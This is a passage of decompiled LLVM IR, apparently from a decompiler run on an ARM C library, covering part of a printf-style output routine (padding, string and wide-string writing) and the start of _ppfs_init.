  %v3_bf2c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_bf2c, i32* %r0.global-to-local, align 4
  %v1_bf34 = inttoptr i32 %v3_bf2c to i32*
  %v2_bf34 = load i32, i32* %v1_bf34, align 4
  br i1 %v7_bf24, label %dec_label_pc_bf34, label %dec_label_pc_bf98

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bf2c
  store i32 %v2_bf34, i32* @r4, align 4
  %v2_bf38 = icmp eq i32 %v2_bf34, 0
  br i1 %v2_bf38, label %dec_label_pc_bf64, label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf34, %dec_label_pc_bfc8
  %v0_bf44 = phi i32 [ %v2_bf34, %dec_label_pc_bf34 ], [ %v4_bfe0, %dec_label_pc_bfc8 ]
  %v3_bf40 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_bf44, i32* %r0.global-to-local, align 4
  %v4_bf48 = ashr i32 %v3_bf40, 31
  %v5_bf48 = or i32 %v4_bf48, %v3_bf40
  %v2_bf4c = inttoptr i32 %v0_bf44 to i8*
  %v3_bf4c = call i32 @strnlen(i8* %v2_bf4c, i32 %v5_bf48)
  store i32 %v3_bf4c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_bf4c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_c068

dec_label_pc_bf64:                                ; preds = %dec_label_pc_bf34, %dec_label_pc_beb4
  %v3_bf64 = load i32, i32* %stack_var_-348, align 4
  %v1_bf68 = icmp slt i32 %v3_bf64, 0
  br i1 %v1_bf68, label %dec_label_pc_bf80, label %dec_label_pc_bf70

dec_label_pc_bf70:                                ; preds = %dec_label_pc_bf64
  %tmp212 = icmp ult i32 %v3_bf64, 6
  br i1 %tmp212, label %dec_label_pc_bf88, label %dec_label_pc_bf80

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bf70, %dec_label_pc_bf64
  br label %dec_label_pc_bf88

dec_label_pc_bf88:                                ; preds = %dec_label_pc_bf70, %dec_label_pc_bf80
  %storemerge97 = phi i32 [ 6, %dec_label_pc_bf80 ], [ 0, %dec_label_pc_bf70 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38940), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_c068

dec_label_pc_bf98:                                ; preds = %dec_label_pc_bf2c
  store i32 %v2_bf34, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_bfd8, i32* @r4, align 4
  store i32 %v2_bf34, i32* %stack_var_-200, align 4
  br label %dec_label_pc_c068thread-pre-split

dec_label_pc_bfc0:                                ; preds = %dec_label_pc_bf24
  br i1 %v7_bfc0, label %dec_label_pc_bfc8, label %dec_label_pc_bfec

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bfc0
  %v0_bfcc = call i32 @__aeabi_read_tp()
  store i32 %v0_bfcc, i32* %r0.global-to-local, align 4
  %v3_bfd0 = load i16, i16* @global_var_24070.401, align 2
  %v4_bfd0 = sext i16 %v3_bfd0 to i32
  %v2_bfd4 = add i32 %v4_bfd0, %v0_bfcc
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  %v4_bfd4 = load i32, i32* %v3_bfd4, align 4
  store i32 %v4_bfd4, i32* @r0, align 4
  %v0_bfdc = load i32, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v0_bfdc, 108
  store i32 %v1_bfdc, i32* @r2, align 4
  %v4_bfe0 = call i32 @__GI___glibc_strerror_r(i32 %v4_bfd4, i32 %v2_bfd8, i32 %v1_bfdc, i32 %v4_bfd0)
  store i32 %v4_bfe0, i32* %r0.global-to-local, align 4
  store i32 %v4_bfe0, i32* @r4, align 4
  br label %dec_label_pc_bf40

dec_label_pc_bfec:                                ; preds = %dec_label_pc_bfc0
  %v4_bff4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1520) to i32*), align 4
  %v1_bffc = add i32 %v4_bff4, 10
  store i32 %v1_bffc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c000

dec_label_pc_c000:                                ; preds = %dec_label_pc_c048, %dec_label_pc_bfec
  %v1_c010 = phi i32 [ %v1_c048, %dec_label_pc_c048 ], [ %v4_bff4, %dec_label_pc_bfec ]
  %v1_c000 = inttoptr i32 %v1_c010 to i8*
  %v2_c000 = load i8, i8* %v1_c000, align 1
  %v3_c000 = zext i8 %v2_c000 to i32
  store i32 %v3_c000, i32* %r2.global-to-local, align 4
  %v9_c008 = icmp eq i32 %v3_c000, %tmp99
  br i1 %v9_c008, label %dec_label_pc_c010, label %dec_label_pc_c048

dec_label_pc_c010:                                ; preds = %dec_label_pc_c000
  %v2_c010 = sub i32 %v1_c010, %v4_bff4
  %v0_c014 = load i32, i32* @fp, align 4
  store i32 %v0_c014, i32* %r0.global-to-local, align 4
  store i32 %v2_c018, i32* @r1, align 4
  store i32 %v2_c01c, i32* %r2.global-to-local, align 4
  %v4_c024 = mul i32 %v2_c010, 4
  %v5_c024 = add i32 %v4_c024, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 14464)
  %v6_c024 = inttoptr i32 %v5_c024 to i32*
  %v7_c024 = load i32, i32* %v6_c024, align 4
  store i32 49200, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_c024)
  %v0_c030 = load i32, i32* %r0.global-to-local, align 4
  %v1_c030 = icmp slt i32 %v0_c030, 0
  br i1 %v1_c030, label %dec_label_pc_c1c0, label %dec_label_pc_c038

dec_label_pc_c038:                                ; preds = %dec_label_pc_c010
  %v2_c03c = add i32 %v0_c030, %v1_c098
  store i32 %v2_c03c, i32* @r1, align 4
  br label %dec_label_pc_c1ac

dec_label_pc_c048:                                ; preds = %dec_label_pc_c000
  %v1_c048 = add i32 %v1_c010, 1
  store i32 %v1_c048, i32* @r1, align 4
  %v3_c04c = icmp ult i32 %v1_c048, %v1_bffc
  br i1 %v3_c04c, label %dec_label_pc_c000, label %dec_label_pc_c1c0

dec_label_pc_c058:                                ; preds = %dec_label_pc_bec4
  %v0_c058 = load i32, i32* @sl, align 4
  store i32 %v0_c058, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_c058, i32* @r4, align 4
  br label %dec_label_pc_c068

dec_label_pc_c068thread-pre-split:                ; preds = %.thread85, %dec_label_pc_be54, %dec_label_pc_bf0c, %dec_label_pc_bf98
  %v1_c06c.pre = phi i32 [ %v1_c06c.pre205, %dec_label_pc_be54 ], [ %v1_c06c.pre.pre, %dec_label_pc_bf0c ], [ 1, %dec_label_pc_bf98 ], [ %v2_bdd4, %.thread85 ]
  %v0_c06c.pre = phi i32 [ 0, %dec_label_pc_be54 ], [ %v0_c06c.pre.pre, %dec_label_pc_bf0c ], [ 0, %dec_label_pc_bf98 ], [ %v2_be48, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_bdc8, %dec_label_pc_be54 ], [ %v0_bcf8, %dec_label_pc_bf0c ], [ %v0_bcf8, %dec_label_pc_bf98 ], [ %v0_bdc8, %.thread85 ]
  %v0_c068.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c068thread-pre-split, %dec_label_pc_bf88, %dec_label_pc_bf40, %dec_label_pc_c058
  %v1_c06c = phi i32 [ %v1_c06c.pre, %dec_label_pc_c068thread-pre-split ], [ %storemerge97, %dec_label_pc_bf88 ], [ %v3_bf4c, %dec_label_pc_bf40 ], [ %v6_bed8, %dec_label_pc_c058 ]
  %v0_c06c = phi i32 [ %v0_c06c.pre, %dec_label_pc_c068thread-pre-split ], [ 0, %dec_label_pc_bf88 ], [ 0, %dec_label_pc_bf40 ], [ %v0_c058, %dec_label_pc_c058 ]
  %v0_c074 = phi i32 [ %v0_c068.pr, %dec_label_pc_c068thread-pre-split ], [ 11, %dec_label_pc_bf88 ], [ 11, %dec_label_pc_bf40 ], [ 11, %dec_label_pc_c058 ]
  %v0_c0b4 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_c068thread-pre-split ], [ %v0_bcf8, %dec_label_pc_bf88 ], [ %v0_bcf8, %dec_label_pc_bf40 ], [ %v0_bcf8, %dec_label_pc_c058 ]
  %v7_c068 = icmp eq i32 %v0_c074, 11
  %v2_c06c = add i32 %v1_c06c, %v0_c06c
  br i1 %v7_c068, label %dec_label_pc_c084, label %bb173

bb173:                                            ; preds = %dec_label_pc_c068
  %v7_c07c = icmp sgt i32 %v0_c074, 5
  %. = select i1 %v7_c07c, i32 2, i32 1
  %v2_c080 = add i32 %v2_c06c, %.
  br label %dec_label_pc_c084

dec_label_pc_c084:                                ; preds = %dec_label_pc_c068, %bb173
  %v0_c098 = phi i32 [ %v2_c06c, %dec_label_pc_c068 ], [ %v2_c080, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_c088 = icmp uge i32 %tmp98, %v0_c098
  %v9_c088 = icmp eq i32 %tmp98, %v0_c098
  %v2_c08c = xor i1 %v9_c088, true
  %v3_c08c = and i1 %v3_c088, %v2_c08c
  br i1 %v3_c08c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_c084
  %v2_c088 = sub i32 %tmp98, %v0_c098
  store i32 %v2_c088, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_c084, %bb174
  store i32 %v1_c098, i32* %r2.global-to-local, align 4
  %v2_c094 = xor i1 %v3_c088, true
  %v3_c094 = or i1 %v9_c088, %v2_c094
  br i1 %v3_c094, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_c09c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_c0ac = phi i32 [ %v1_c09c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_c098 = add i32 %v0_c098, %v1_c098
  %v2_c09c = add i32 %v2_c098, %v2_c0ac
  %v0_c0a8 = load i32, i32* @sb, align 4
  %v7_c0a8 = icmp eq i32 %v0_c0a8, 48
  br i1 %v7_c0a8, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_c0ac = add i32 %v2_c0ac, %v0_c06c
  store i32 %v3_c0ac, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_c0c4 = phi i32 [ %v2_c0ac, %bb177 ], [ 0, %bb178 ]
  %v1_c0b4 = and i32 %v0_c0b4, 8
  store i32 %v1_c0b4, i32* @r7, align 4
  %v2_c0b4 = icmp eq i32 %v1_c0b4, 0
  br i1 %v2_c0b4, label %dec_label_pc_c0bc, label %dec_label_pc_c0d8

dec_label_pc_c0bc:                                ; preds = %.thread30
  %v0_c0bc = load i32, i32* @fp, align 4
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  store i32 %v0_c0c4, i32* %r2.global-to-local, align 4
  %v4_c0c8 = call i32 @_charpad(i32 %v0_c0bc, i8 32, i32 %v0_c0c4)
  store i32 %v4_c0c8, i32* %r0.global-to-local, align 4
  %v1_c0cc = load i32, i32* @sl, align 4
  %v9_c0cc = icmp eq i32 %v4_c0c8, %v1_c0cc
  br i1 %v9_c0cc, label %dec_label_pc_c0d4, label %dec_label_pc_c1c0

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c0bc
  %v0_c0d4 = load i32, i32* @r7, align 4
  store i32 %v0_c0d4, i32* @sl, align 4
  %v0_c0e0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c0d8

dec_label_pc_c0d8:                                ; preds = %.thread30, %dec_label_pc_c0d4
  %v0_c0e0 = phi i32 [ %v0_c074, %.thread30 ], [ %v0_c0e0.pre, %dec_label_pc_c0d4 ]
  %v0_c0dc = load i32, i32* @fp, align 4
  %v2_c0e0 = add i32 %v0_c0e0, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38932)
  store i32 %v2_c0e0, i32* %r0.global-to-local, align 4
  %v2_c0e4 = inttoptr i32 %v2_c0e0 to i8*
  %v3_c0e4 = call i32 @__GI_fputs_unlocked(i8* %v2_c0e4, i32 %v0_c0dc)
  %v0_c0e8 = load i32, i32* @fp, align 4
  store i32 %v0_c0e8, i32* %r0.global-to-local, align 4
  %v0_c0f0 = load i32, i32* @r8, align 4
  store i32 %v0_c0f0, i32* %r2.global-to-local, align 4
  %v4_c0f4 = call i32 @_charpad(i32 %v0_c0e8, i8 48, i32 %v0_c0f0)
  store i32 %v4_c0f4, i32* %r0.global-to-local, align 4
  %v1_c0f8 = load i32, i32* @r8, align 4
  %v9_c0f8 = icmp eq i32 %v4_c0f4, %v1_c0f8
  br i1 %v9_c0f8, label %dec_label_pc_c100, label %dec_label_pc_c1c0

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0d8
  %v3_c100 = load i32, i32* %stack_var_-44, align 4
  %v2_c104 = icmp eq i32 %v3_c100, 0
  br i1 %v2_c104, label %dec_label_pc_c10c, label %dec_label_pc_c130

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100
  %v0_c10c = load i32, i32* @r5, align 4
  %v2_c10c = icmp eq i32 %v0_c10c, 0
  br i1 %v2_c10c, label %dec_label_pc_c194, label %dec_label_pc_c114

dec_label_pc_c114:                                ; preds = %dec_label_pc_c10c
  %v0_c114 = load i32, i32* @r4, align 4
  store i32 %v0_c114, i32* %r0.global-to-local, align 4
  %v0_c11c = load i32, i32* @fp, align 4
  store i32 %v0_c11c, i32* %r2.global-to-local, align 4
  %v3_c120 = inttoptr i32 %v0_c11c to i16*
  %v4_c120 = call i32 @__stdio_fwrite(i32 %v0_c114, i32 %v0_c10c, i16* %v3_c120)
  store i32 %v4_c120, i32* %r0.global-to-local, align 4
  %v1_c124 = load i32, i32* @r5, align 4
  %v9_c124 = icmp eq i32 %v4_c120, %v1_c124
  br i1 %v9_c124, label %dec_label_pc_c194, label %dec_label_pc_c1c0

dec_label_pc_c130:                                ; preds = %dec_label_pc_c100
  store i32 %v2_bfd8, i32* @r6, align 4
  store i32 %v2_bec8, i32* @r8, align 4
  store i32 %v2_bed4, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_c180.pr = load i32, i32* @r5, align 4
  %v2_c18041 = icmp eq i32 %v0_c180.pr, 0
  store i32 %v2_bec8, i32* @r1, align 4
  store i32 %v2_bfd8, i32* @r0, align 4
  br i1 %v2_c18041, label %dec_label_pc_c194, label %dec_label_pc_c148

dec_label_pc_c148:                                ; preds = %dec_label_pc_c130, %dec_label_pc_c17c
  %v1_c14c = phi i32 [ %v2_c17c, %dec_label_pc_c17c ], [ %v0_c180.pr, %dec_label_pc_c130 ]
  %v2_c148 = icmp ult i32 %v1_c14c, 128
  %.v1_c14c = select i1 %v2_c148, i32 %v1_c14c, i32 128
  store i32 %.v1_c14c, i32* %r2.global-to-local, align 4
  %v6_c154 = call i32 @__GI_wcsrtombs(i32 %v2_bfd8, i32 %v2_bec8, i32 %.v1_c14c, i32 %v2_bed4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c154, i32* @r4, align 4
  %v2_c158 = icmp eq i32 %v6_c154, 0
  store i32 %v6_c154, i32* %r0.global-to-local, align 4
  br i1 %v2_c158, label %dec_label_pc_c17c, label %dec_label_pc_c164

dec_label_pc_c164:                                ; preds = %dec_label_pc_c148
  store i32 %v2_bfd8, i32* %r0.global-to-local, align 4
  %v0_c16c = load i32, i32* @fp, align 4
  store i32 %v0_c16c, i32* %r2.global-to-local, align 4
  %v3_c170 = inttoptr i32 %v0_c16c to i16*
  %v4_c170 = call i32 @__stdio_fwrite(i32 %v2_bfd8, i32 %v6_c154, i16* %v3_c170)
  store i32 %v4_c170, i32* %r0.global-to-local, align 4
  %v1_c174 = load i32, i32* @r4, align 4
  %v9_c174 = icmp eq i32 %v4_c170, %v1_c174
  br i1 %v9_c174, label %dec_label_pc_c17c, label %dec_label_pc_c1c0

dec_label_pc_c17c:                                ; preds = %dec_label_pc_c164, %dec_label_pc_c148
  %v0_c17c = phi i32 [ %v4_c170, %dec_label_pc_c164 ], [ 0, %dec_label_pc_c148 ]
  %v1_c17c = load i32, i32* @r5, align 4
  %v2_c17c = sub i32 %v1_c17c, %v0_c17c
  store i32 %v2_c17c, i32* @r5, align 4
  %v2_c180 = icmp eq i32 %v2_c17c, 0
  store i32 %v2_bec8, i32* @r1, align 4
  store i32 %v2_bfd8, i32* @r0, align 4
  br i1 %v2_c180, label %dec_label_pc_c194, label %dec_label_pc_c148

dec_label_pc_c194:                                ; preds = %dec_label_pc_c17c, %dec_label_pc_c130, %dec_label_pc_c114, %dec_label_pc_c10c
  %v0_c194 = load i32, i32* @fp, align 4
  store i32 %v0_c194, i32* %r0.global-to-local, align 4
  %v0_c19c = load i32, i32* @sl, align 4
  store i32 %v0_c19c, i32* %r2.global-to-local, align 4
  %v4_c1a0 = call i32 @_charpad(i32 %v0_c194, i8 32, i32 %v0_c19c)
  store i32 %v4_c1a0, i32* %r0.global-to-local, align 4
  %v1_c1a4 = load i32, i32* @sl, align 4
  %v9_c1a4 = icmp eq i32 %v4_c1a0, %v1_c1a4
  br i1 %v9_c1a4, label %dec_label_pc_c1ac, label %dec_label_pc_c1c0

dec_label_pc_c1ac:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c038, %dec_label_pc_be8c, %dec_label_pc_bc9c
  %stack_var_-336.4 = phi i32 [ %v0_bcf8, %dec_label_pc_bc9c ], [ %v0_c0b4, %dec_label_pc_c194 ], [ %v0_bcf8, %dec_label_pc_c038 ], [ %v0_bcf8, %dec_label_pc_be8c ]
  %stack_var_-356.3 = phi i32 [ %v1_c098, %dec_label_pc_bc9c ], [ %v2_c09c, %dec_label_pc_c194 ], [ %v2_c03c, %dec_label_pc_c038 ], [ %v2_be90, %dec_label_pc_be8c ]
  %v3_c1ac = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_c1ac, i32* @r4, align 4
  store i32 %v3_c1ac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bbc4.outer

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_bc20
  %v1_c1b8 = add i32 %v0_bc28, 2
  store i32 %v1_c1b8, i32* @r4, align 4
  br label %dec_label_pc_bbc4.outer36

dec_label_pc_c1c0:                                ; preds = %dec_label_pc_c048, %dec_label_pc_bec4, %dec_label_pc_c194, %dec_label_pc_c114, %dec_label_pc_c0d8, %dec_label_pc_c0bc, %dec_label_pc_c010, %dec_label_pc_beec, %dec_label_pc_be64, %bb142, %dec_label_pc_c164
  br label %dec_label_pc_c1c8

dec_label_pc_c1c8:                                ; preds = %dec_label_pc_bc14, %bb, %dec_label_pc_bb58, %dec_label_pc_c1c0
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_bb58 ], [ -1, %dec_label_pc_c1c0 ], [ %v1_c098, %dec_label_pc_bc14 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_bb08, i32* @r5, align 4
  store i32 %v9_bb08, i32* @r6, align 4
  store i32 %v12_bb08, i32* @r7, align 4
  store i32 %v15_bb08, i32* @r8, align 4
  store i32 %v18_bb08, i32* @sb, align 4
  store i32 %v21_bb08, i32* @sl, align 4
  store i32 %v24_bb08, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_c1b8, { 1, 0 }
  uselistorder i32 %v3_c1ac, { 1, 2, 0 }
  uselistorder i32 %v2_c17c, { 1, 2, 0 }
  uselistorder i32 %v0_c0c4, { 1, 0 }
  uselistorder i32 %v2_c0ac, { 2, 0, 1 }
  uselistorder i1 %v9_c088, { 1, 0 }
  uselistorder i32 %v2_c06c, { 1, 0 }
  uselistorder i32 %v0_c0b4, { 1, 0 }
  uselistorder i32 %v0_c06c, { 1, 0 }
  uselistorder i32 %v1_c048, { 1, 2, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2 }
  uselistorder i32 %v4_bfe0, { 1, 2, 0 }
  uselistorder i32 %v4_bfd0, { 1, 0 }
  uselistorder i32 %v0_bf44, { 1, 0 }
  uselistorder i32 %v2_bf34, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_befc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_be74, { 1, 0 }
  uselistorder i32 %v2_bdd4, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_bdf0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_bd70, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_bcd8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_bc7c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_bc74, { 1, 0 }
  uselistorder i32 %v1_bc20, { 0, 1, 3, 2 }
  uselistorder i32 %v1_c098, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9 }
  uselistorder i32 %v2_bbe0, { 0, 2, 1 }
  uselistorder i32 %v1_bbd8.lcssa, { 1, 0 }
  uselistorder i8 %v2_bbc4, { 1, 0 }
  uselistorder i32 %v2_bbd8, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_bbf0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bcf8, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_bde8, { 1, 0 }
  uselistorder i1 %v7_bd38, { 1, 2, 0 }
  uselistorder i1 %v7_bf24, { 1, 0 }
  uselistorder i1 %v7_be9c, { 1, 0 }
  uselistorder i1 %v7_bd78, { 1, 0 }
  uselistorder i32 %v2_bed4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_bec8, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_c018, { 1, 0 }
  uselistorder i32 %v2_bfd8, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_bc78, { 1, 3, 2, 0 }
  uselistorder i32 %v4_bc54, { 1, 0 }
  uselistorder i32 %v2_bb10, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 22, 12, 13, 14, 15, 16, 17, 18, 0, 20, 21, 23, 25, 24, 1, 26, 27, 28, 29, 30 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 5, 8, 7, 9, 11, 10, 16, 12, 13, 14, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 32, 30, 31, 35, 36, 33, 34, 46, 37, 47, 48, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -99724), { 1, 0 }
  uselistorder label %dec_label_pc_c1c8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_c1c0, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_c148, { 1, 0 }
  uselistorder label %dec_label_pc_c0d8, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_c084, { 1, 0 }
  uselistorder label %dec_label_pc_c068, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_c068thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_bf88, { 1, 0 }
  uselistorder label %dec_label_pc_bf40, { 1, 0 }
  uselistorder label %dec_label_pc_be54, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_bd28, { 1, 0 }
  uselistorder label %dec_label_pc_bd24, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bc70, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_bc14, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_bbe0, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_bbc4.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_c1fc = load i32, i32* @r4, align 4
  %v6_c1fc = load i32, i32* @r5, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_c208 = load i32, i32* @r1, align 4
  store i32 %v0_c208, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c214 = bitcast i32* %arg1 to i8*
  %v4_c214 = call i32 @__GI_memset(i8* %v3_c214, i32 0, i32 152)
  store i32 %v4_c214, i32* %r0.global-to-local, align 4
  %v0_c218 = load i32, i32* @r4, align 4
  %v1_c218 = add i32 %v0_c218, 24
  %v2_c218 = inttoptr i32 %v1_c218 to i32*
  %v3_c218 = load i32, i32* %v2_c218, align 4
  store i32 %v3_c218, i32* %r3.global-to-local, align 4
  %v0_c21c = load i32, i32* @r5, align 4
  %v2_c21c = inttoptr i32 %v0_c218 to i32*
  store i32 %v0_c21c, i32* %v2_c21c, align 4
  %v0_c220 = load i32, i32* %r3.global-to-local, align 4
  %v1_c220 = add i32 %v0_c220, -1
  %v1_c224 = load i32, i32* @r4, align 4
  %v2_c224 = add i32 %v1_c224, 24
  %v3_c224 = inttoptr i32 %v2_c224 to i32*
  store i32 %v1_c220, i32* %v3_c224, align 4
  %v0_c228 = load i32, i32* @r4, align 4
  %v1_c228 = add i32 %v0_c228, 40
  store i32 %v1_c228, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c23821 = inttoptr i32 %v1_c228 to i32*
  store i32 8, i32* %v2_c23821, align 4
  %v3_c23822 = load i32, i32* %r2.global-to-local, align 4
  %v4_c23823 = add i32 %v3_c23822, 4
  store i32 %v4_c23823, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c234.dec_label_pc_c234_crit_edge

dec_label_pc_c234.dec_label_pc_c234_crit_edge:    ; preds = %entry, %dec_label_pc_c234.dec_label_pc_c234_crit_edge
  %v4_c23824 = phi i32 [ %v4_c23823, %entry ], [ %v4_c238, %dec_label_pc_c234.dec_label_pc_c234_crit_edge ]
  %v0_c234.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_c238.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_c234 = add i32 %v0_c234.pre, -1
  store i32 %v1_c234, i32* %r3.global-to-local, align 4
  %v7_c234 = icmp eq i32 %v0_c234.pre, 1
  %v2_c238 = inttoptr i32 %v4_c23824 to i32*
  store i32 %v0_c238.pre, i32* %v2_c238, align 4
  %v3_c238 = load i32, i32* %r2.global-to-local, align 4
  %v4_c238 = add i32 %v3_c238, 4
  store i32 %v4_c238, i32* %r2.global-to-local, align 4
  br i1 %v7_c234, label %dec_label_pc_c240, label %dec_label_pc_c234.dec_label_pc_c234_crit_edge

dec_label_pc_c240:                                ; preds = %dec_label_pc_c234.dec_label_pc_c234_crit_edge
  %v0_c240 = load i32, i32* @r5, align 4
  store i32 %v0_c240, i32* %r2.global-to-local, align 4
  %v1_c2802 = inttoptr i32 %v0_c240 to i8*
  %v2_c2803 = load i8, i8* %v1_c2802, align 1
  %v3_c2804 = zext i8 %v2_c2803 to i32
  store i32 %v3_c2804, i32* %r0.global-to-local, align 4
  %v2_c2845 = icmp eq i8 %v2_c2803, 0
  br i1 %v2_c2845, label %dec_label_pc_c28c, label %dec_label_pc_c248

dec_label_pc_c248:                                ; preds = %dec_label_pc_c240, %dec_label_pc_c280.backedge
  %v0_c250 = phi i32 [ %storemerge, %dec_label_pc_c280.backedge ], [ %v0_c240, %dec_label_pc_c240 ]
  %v0_c248 = phi i32 [ %v3_c280, %dec_label_pc_c280.backedge ], [ %v3_c2804, %dec_label_pc_c240 ]
  %v7_c248 = icmp eq i32 %v0_c248, 37
